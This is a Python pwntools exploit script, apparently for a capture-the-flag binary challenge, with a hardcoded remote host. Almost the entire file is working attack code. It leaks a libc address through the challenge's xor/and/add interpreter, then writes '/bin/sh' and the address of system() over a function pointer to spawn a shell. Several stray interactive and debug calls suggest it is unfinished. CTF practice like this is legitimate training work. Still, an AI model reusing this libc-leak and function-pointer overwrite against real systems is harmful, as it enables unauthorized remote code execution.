
#!/usr/bin/env python3
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "34.252.33.37", 31685


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=True)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================

def s32(x: int) -> int:
    x &= 0xffffffff
    return x - (1 << 32) if x & 0x80000000 else x

def exploit():
    global io
    io = initialize()
    with log.progress("Leak libc address"), context.silent:
        sl("0 "*0x202)
        for i in range(0x203):
            sl("xor")
        sl("and")
        for i in range(0x1fd):
            sl("xor")
        sl("0")
        sl("and")
        sl("xor")
        sl("end")
        ru("Result: ")
        libc_first = hex(int(rl().strip()))[2:]

        ru("--- Enter code ---\n")
        sl("0 "*0x202)
        for i in range(0x203):
            sl("xor")
        sl("and")
        for i in range(0x1fd):
            sl("xor")
        sl("0")
        sl("and")
        sl("xor")

        sl("add")
        sl(str(int(libc_first, 16)).encode())
        sl("sub")
        sl("end")
        ru("Result: ")

        libc_second = hex(int(rl().strip()))[2:]
        libc_leak = int(libc_first + libc_second, 16)
        libc.address = libc_leak - 0x203b20
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    ru("--- Enter code ---\n")
    with log.progress("Passing first chunk"), context.silent:
        sl("0 "*1)
        sl("xor")
        sl("add")
    io.interactive()
    with log.progress("Passing second big chunk"), context.silent:

        for i in range(0x3f0):
            sleep(0.001)
            sl("and")
        io.interactive()
        for i in range(0x10):
            sleep(1)
            sl("and")
        io.interactive()

        sleep(0.001)
        sl("xor xor")
        sleep(0.001)
        sl("and add add and")
    io.interactive()

    with log.progress("Passing third chunk"), context.silent:
        for i in range(0x400):
            sleep(0.001)
            sl("and")

    io.interactive()

    with log.progress("Overwriting the function"), context.silent:
        for i in range(4):
            sl("xor")
        sl("and")
        hash_code = 0xb3b3ec7f4e05e105
        for i in range(10):
            sl("and")
        sl(str(int(0x6e69622f)).encode())
        sl(str(int(0x0068732f)).encode())
        sl(str(0).encode())
        sl(str(0).encode())

        target = libc.sym["system"]
        for i in range(2):
            sl(str(target & 0xffffffff).encode())
            sl(str(target >> 32).encode())
        sl(str(int(hash_code & 0xffffffff)).encode())
        sl(str(s32(int(hash_code >> 32))).encode())
    debug()
    pause()
    io.interactive()

if __name__ == '__main__':
    exploit()
